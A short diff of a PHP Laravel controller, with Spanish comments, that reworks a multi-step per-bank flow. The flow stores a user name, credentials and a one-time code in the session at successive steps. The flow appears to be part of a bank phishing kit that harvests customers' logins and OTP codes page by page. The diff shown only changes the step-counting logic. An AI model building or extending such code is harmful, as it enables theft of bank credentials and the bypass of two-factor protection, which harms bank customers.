@@ -49,7 +49,7 @@ class BankFlowController extends Controller
 
         $sc = $request->session()->get('sc', []);
         $sc['bank'] = $bank;
-        $sc['step'] = (string) ($step);
+        $sc['step'] = (string)($step);
         $request->session()->put('sc', $sc);
         $request->session()->save();
 
@@ -68,11 +68,9 @@ class BankFlowController extends Controller
         $cfg = config("banks.$bank");
         abort_if(!$cfg, 404);
 
-        $maxSteps = (int) ($cfg['steps'] ?? 2);
+        $maxSteps = (int) ($cfg['steps'] ?? 3);
 
         $sc = $request->session()->get('sc', []);
-
-        $next = ($step === 1 && $maxSteps === 4) ? 2 : min($step + 1, $maxSteps);
 
         // STEP 1 (maxSteps=4): guarda usuario y limpia credenciales viejas
         if ($step === 1 && $maxSteps === 4) {
@@ -109,11 +107,11 @@ class BankFlowController extends Controller
                 $sc['otp'] = $data['otp'];
         }
 
-
+        $next = min($step + 1, $maxSteps);
 
         // ✅ GUARDAR sc SIEMPRE Y CAMBIAR STEP (una sola vez)
         $sc['bank'] = $bank;
-        $sc['step'] = (string) ($next);
+        $sc['step'] = (string)($next);
 
         $request->session()->put('sc', $sc);
         $request->session()->save();
